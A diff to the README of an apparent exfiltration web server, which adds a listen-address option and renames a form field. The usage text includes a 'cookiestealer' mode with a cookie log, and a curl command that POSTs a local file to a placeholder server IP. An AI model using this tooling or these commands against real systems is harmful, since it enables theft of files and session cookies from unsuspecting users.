@@ -9,13 +9,14 @@ A simple webserver you can send files or cookies to. I wrote it specifically for
 ### CLI arguments
 
 ```plaintext=
--h          help
--p <port>   specify the port, which the server should run on. Default: 6969
--s <size>   max file size. Default: ~33MB
--k          killswitch, server shuts down after receiving a file
+-h           help
+-a <address> address to listen on
+-p <port>    specify the port, which the server should run on. Default: 6969
+-s <size>    max file size. Default: ~33MB
+-k           killswitch, server shuts down after receiving a file
 
--c          activate cookiestealer
--cl         Output file for cookielog. -c needs to be provided. Default: cookielog.txt
+-c           activate cookiestealer
+-cl          Output file for cookielog. -c needs to be provided. Default: cookielog.txt
 ```
 
 ### Send data
@@ -23,7 +24,7 @@ A simple webserver you can send files or cookies to. I wrote it specifically for
 **POST**
 
 ```bash=
-curl -X POST --form "exfiltrated=@/path/to/file" http://<server-ip>:6969
+curl -X POST --form "data=@/path/to/file" http://<server-ip>:6969
 ```
 
 **Cookies via POST**
